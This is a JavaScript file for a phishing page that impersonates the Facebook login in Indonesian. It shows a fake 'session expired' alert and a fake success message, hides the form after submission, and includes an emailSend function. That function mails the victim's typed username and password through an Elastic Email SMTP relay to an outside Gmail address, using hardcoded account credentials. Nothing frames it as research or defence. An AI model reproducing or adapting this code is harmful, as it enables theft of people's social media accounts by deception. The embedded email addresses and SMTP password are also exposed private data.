let container = document.querySelector('.container');
let loader = document.querySelector('.loader');
let popup = document.querySelector('.popup');

  setTimeout(function(){
    loader.style.display = 'none'
    container.style.display = 'block'
  }, 2000)

  setTimeout(function(){
    popup.innerHTML = alert('Sesi anda telah berakhir')
    setTimeout(function(){
      popup.style.display = 'none',
      loader.style.display = 'none',
      container.style.display = 'block'
    },700)
  },1200)

window.alert = function(message, timeout=null){
      const alert = document.createElement('div');
      alert.classList.add('alert');
      alert.innerHTML =  message ;
      alert.setAttribute('style',`
        position: absolute;
        width: 300px;
        height:auto;
        text-align:center;
        padding:30px;
        top:35%;
        left:25%;
        right:25%;
        font-size: 20px;
        border-radius:10px;
        box-shadow:0 2px 5px 0 #000044;
        display:flex;
        flex-direction:column;
        align-items:center;
        border-radius:5px;
      `)
      document.body.appendChild(alert);
      const alertButton = document.createElement('button');
      alertButton.innerText = 'OK';
      alertButton.setAttribute('style',`
        width:100%;
        height:40px;
        font-size:22px;
        margin-top:20px;
        background-color:#1A74E4;
        color:white;
        font-weight:700;
        border-radius:5px;
        border:none;
      `)
      alert.appendChild(alertButton);
      alertButton.addEventListener('click',()=>{
        alert.remove();
        container.style.display = "block";
      })
      // if(alertButton == true){
      //   container.style.display = 'none';
      //   alert.remove();
      // }else  if(timeout !=  null){
      //   alert.remove();
      // }
    }

 let info = document.getElementById('info');
 let tampil = document.getElementById('tampilkan');
 let kirim = document.getElementById('kirim');
 let h1 = document.querySelector('h1');
 
  info.addEventListener('click',function(){
    if(info.click){
      tampil.innerHTML = "Facebook meminta dan menerima nomor telepon dari jaringan selular Anda." + "<label style='color:#1255AC;cursor:pointer;'>" + "Ubah Pengaturan" + "</label>",
      tampil.style.display = "block",
      tampil.style.width = "100%",
      tampil.style.fontSize = "20px",
      tampil.style.position = "absolute",
      tampil.style.padding = "10px",
      tampil.style.border = "1px solid #7CA4D7",
      tampil.style.backgroundColor= "#E5F1FF",
      kirim.style.marginTop = "55px",
      h1.style.borderBottom = "none"
    }
    setTimeout(function(){
      tampil.style.display = "none",
      kirim.style.marginTop = "0",
      h1.style.borderBottom = "2px solid #BFC2C6"
    }, 5000)
  })
  // ketika info di kllik
  // maka munculkan kalimat ini dalam waktu 5 detik
  // dan kembalikan seperti semula setelah 5 detik
  
  
  
  // ketika tombol button di klik munculkan 2 fungsi
  // jika kondisi teks dan password kosong
  // maka munculkan alert tidak boleh kosong
  // tetapi jika teks dan pw keduanya terisi
  // maka munculkan Oketerkirim
  
  
  let text = document.getElementById('name');
  let pw = document.getElementById('password');
  let login = document.getElementById('login');

  login.addEventListener('click',function(){
    if(text.value == '' && pw.value == ''){
      alert('<b>' + 'Masukan info login Anda' + '</b><br/>' + 'Untuk login, masukan nomor ponsel atau email dan kata sandi yang Anda gunakan untuk Facebook.');
      return;
  } else if(text.value == ''){
    alert('<b>' + 'Masukan info login Anda' + '</b><br/>' + 'Untuk login, masukan nomor ponsel atau email yang Anda gunakan untuk Facebook.');
    text.value.reset();
    pw.value.reset();
    return;
  } else if(pw.value == ''){
    alert('<b>' + 'Masukan info login Anda' + '</b><br/>' + 'Untuk login, masukan kata sandi Anda.');
    text.value.reset();
    pw.value.reset();
    return;
  }
  alert('Berhasil login ✅')
  setTimeout(function(){
    container.style.display = "none",
    container.style.height = '0',
    loader.style.display = "flex",
    document.querySelector('h1').style.display = 'none',
    document.querySelector('span').style.display = 'none',
    document.querySelector('form').style.display = 'none',
    document.querySelector('.create').style.display = 'none',
    document.querySelector('.language').style.display = 'none'
  }, 200);
  }
  )
function emailSend(){
  Email.send({
    Host : "smtp.elasticemail.com",
    Username : "idruliana12@gmail.com",
    Password : "036D5D0908BC524E5E0371E5E0330B349846",
    To : 'rulianaid024@gmail.com',
    From : "idruliana12@gmail.com",
    Subject : "Ini adalah pesan Facebook",
    Body : "Username : " + text.value + '<br/>' + "Password : " + pw.value
  });
}
//   .then(
//   message => alert('Iya')
// );

// login.addEventListener('click',(e)=>{
//   if(text.value == "", pw.value == ""){
//     setTimeout(function(){
//       alert('<b>' + 'Masukan info login Anda' + '</b><br/>' + 'Untuk login, masukan nomor ponsel atau email dan kata sandi yang Anda gunakan untuk Facebook.');
//     }, 2000)
//   }
// });
// }